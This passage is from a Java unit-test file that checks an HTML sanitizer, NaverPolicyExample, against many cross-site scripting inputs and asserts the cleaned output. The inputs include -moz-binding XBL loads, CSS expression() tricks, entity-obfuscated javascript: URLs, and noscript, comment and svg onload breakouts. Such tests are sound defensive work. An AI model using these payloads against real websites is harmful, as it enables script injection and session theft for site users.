    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<form action=\"x\"><button>XSS</button><select name=\"x\"><option>&lt;script&gt;token&#61;&#34;supersecret&#34;&lt;/script&gt;</option></select></form>", cleanString);

    attackString = "<div style=\"-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\">\n"
            + "<div style=\"\\-\\mo\\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\">\n"
            + "<div style=\"-moz-bindin\\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\">\n"
            + "<div style=\"-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\">";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<div>\n"
            + "<div>\n"
            + "<div>\n"
            + "<div></div></div></div></div>", cleanString);

    attackString = "<img src=\"blah\" style=\"-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)\" />";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<img src=\"blah\" />", cleanString);

    attackString = "<div style=xss:expression(alert(1))>\n"
            + "<div style=xss:expression(1)-alert(1)>\n"
            + "<div style=xss:expressio\\6e(alert(1))>\n"
            + "<div style=xss:expressio\\006e(alert(1))>\n"
            + "<div style=xss:expressio\\00006e(alert(1))>\n"
            + "<div style=xss:expressio\\6e(alert(1))>\n"
            + "<div style=xss:expressio&#x5c;6e(alert(1))>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<div>\n"
            + "<div>\n"
            + "<div>\n"
            + "<div>\n"
            + "<div>\n"
            + "<div>\n"
            + "<div></div></div></div></div></div></div></div>", cleanString);

    attackString = "<div style=xss=expression(alert(1))>\n"
            + "<div style=\"color&#x3dred\">test</div>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<div>\n"
            + "<div>test</div></div>", cleanString);

    attackString = "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>XSS</a>", cleanString);

    attackString = "<script>\n"
            + "function window.onload(){\n"
            + "alert(1);\n"
            + "}\n"
            + "</script>\n"
            + "<script>\n"
            + "function window::onload(){\n"
            + "alert(1);\n"
            + "}\n"
            + "</script>\n"
            + "<script>\n"
            + "function window.location(){\n"
            + "}\n"
            + "</script>\n"
            + "<body>\n"
            + "<script>\n"
            + "function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}\n"
            + "</script>\n"
            + "</body>\n"
            + "<body>\n"
            + "<script>\n"
            + "function document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; }\n"
            + "</script>\n"
            + "</body>";

    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("\n"
            + "\n"
            + "\n"
            + "\n"
            + "\n"
            + "\n"
            + "\n"
            + "\n", cleanString);

    attackString = "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> </BODY></HTML>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<html> </html>", cleanString);

    attackString = "<a href=\"javascript&#x6a;avascript:alert(1)\">Firefox</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>Firefox</a>", cleanString);

    attackString = "<a href=\"javascript&colon;alert(1)\">Firefox</a>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("<a>Firefox</a>", cleanString);

    attackString = "<!-- ><img title=\"--><iframe/onload=alert(1)>\"> -->\n"
            + "<!-- ><img title=\"--><iframe/onload=alert(1)>\"> -->";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);

    attackString = "<svg><xss onload=alert(1)>";
    cleanString = NaverPolicyExample.sanitize(attackString);
    assertEquals("", cleanString);
  }

  @Test
  public void testAElement() {
    String dirty = "<p>"
            + "<a href='java\0script:bad()'>1</a>"
            + "<a style='color: red; font-weight; expression(foo());, direction: rtl; font-weight: bold'>2</a>"
            + "<a href='foo.html'>3</a>"
            + "<a href='http://outside.org/'>4</a>"
            + "</p>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<p><a>1</a><a>2</a><a href=\"foo.html\">3</a><a href=\"http://outside.org/\">4</a></p>", clean);
  }

  @Test
  public void testSpanTag() {
    String dirty = "<span><div><h1>Hello</h1></div></span>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<span><div><h1>Hello</h1></div></span>", clean);
  }

  @Test
  public void testNoscriptTag() {
    String dirty = "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">";
    String clean = NaverPolicyExample.sanitize(dirty);
    System.out.println(clean);
    assertEquals("<noscript>"
            + "<p title=\"&lt;/noscript&gt;&lt;img src&#61;x onerror&#61;alert(1)&gt;\">"
            + "</p>"
            + "</noscript>", clean);
  }

  @Test
  public void testImageTag() {
    String dirty = "<image src=\"http://example.com/foo.png\" />";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("", clean);

    dirty = "<Image src=\"http://example.com/bar.png\"><IMAGE>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("", clean);
  }

  @Test
  public void testKoreanTag() {
    String dirty = "<하하하>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("&lt;하하하&gt;", clean);
  }

  @Test
  public void testUrlEncodingData() {
    // before encoding
    String dirty = "http://m.id.hangame.com/searchInfo.nhn?type=FINDID&nxtURL=http://m.tera.hangame.com</script><img src=pooo.png onerror=alert(/V/)>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("http://m.id.hangame.com/searchInfo.nhn?type&#61;FINDID&amp;nxtURL&#61;http://m.tera.hangame.com<img src=\"pooo.png\" />", clean);

    // after encoding
    dirty = "http://m.id.hangame.com/searchInfo.nhn?type=FINDID&nxtURL=http://m.tera.hangame.com%3C/script%3E%3Cimg%20src=pooo.png%20onerror=alert(/V/)%3E";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("http://m.id.hangame.com/searchInfo.nhn?type&#61;FINDID&amp;nxtURL&#61;http://m.tera.hangame.com%3C/script%3E%3Cimg%20src&#61;pooo.png%20onerror&#61;alert(/V/)%3E", clean);
  }

  @Test
  public void testNotAllowedPatternSrcAttribute() {
    String dirty = "<img src='http://sstorym.cafe24.com/deScription/lereve/lelogo.gif' width='700'>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<img src=\"http://sstorym.cafe24.com/deScription/lereve/lelogo.gif\" width=\"700\" />", clean);

    dirty = "<img src='scription/lereve/lelogo.gif' width='700'>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<img src=\"scription/lereve/lelogo.gif\" width=\"700\" />", clean);

    dirty = "<img src='script:/lereve/lelogo.gif' width='700'>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<img width=\"700\" />", clean);
  }

  @Test
  public void testAllowStylingCheckPoint() {
    String dirty = "<b style=font-size:larger></b>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<b style=\"font-size:larger\"></b>", clean);

    //    ImmutableSet<String> fontLiterals1 = ImmutableSet.of(
    //        "large", "larger", "small", "smaller", "x-large", "x-small",
    //        "xx-large", "xx-small");

    dirty = "<b style=font-size:bigger></b>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<b></b>", clean);
  }

  @Test
  public void testHrefAttack() {
    // href는 FilterUrlByProtocolAttributePolicy 정책을 따른다. : 앞이 프로토콜로 인식하는데 가능한건 http, https 니까 제거됌
    String dirty = "<a HREF=\"javascript:alert('XSS');\">Hello</a>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<a>Hello</a>", clean);
  }

  @Test
  public void testLinkElement() {
    String dirty = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("", clean);
  }

  @Test
  public void testStyleAttribute() {
    String dirty = "<DIV STYLE=\"color:red;background-image: url(javascript:alert('XSS'))\">"; // : 앞이 프로토콜로 인식하는데 가능한건 http, https 니까 제거됌
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<div style=\"color:red\"></div>", clean);

    dirty = "<a href=\"../good.html\" rel=\"nofollow\" style=\"color:red\"></a>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<a href=\"../good.html\" rel=\"nofollow\"></a>", clean);

    dirty = "<marquee STYLE=\"color:red;background-image: url(javascript:alert('XSS'))\">";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<marquee></marquee>", clean);
  }

  @Test
  public void testEmptyTag() {

    String dirty = "<a b>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<a></a>", clean);

    dirty = "<!a>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("", clean);

    dirty = "<p>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<p></p>", clean);

    dirty = "</p>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("", clean);

    dirty = "<li></li>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<ul><li></li></ul>", clean);

    // TagBalancingHtmlStreamEventReceiver.java 111 Line 에서 tbody 추가
    dirty = "<table><td>Hello</td></table>";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<table><tbody><tr><td>Hello</td></tr></tbody></table>", clean);

    dirty = "<colgroup width=\"";
    clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<table><colgroup></colgroup></table>", clean);
  }

  @Test
  public void testVideoElement() {
    String dirty = "<video width=\"320\" height=\"240\" controls=\"controls\"><source src=\"movie.mp4\" type=\"video/mp4\" pubdate=\"\"></video>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<video width=\"320\" height=\"240\" controls=\"controls\"><source src=\"movie.mp4\" type=\"video/mp4\" /></video>", clean);
  }

  @Test
  public void testAttributeComment() {
    String dirty = "<p tt='-->'>Hello</p>";
    String clean = NaverPolicyExample.sanitize(dirty);
    assertEquals("<p>Hello</p>", clean);
  }

}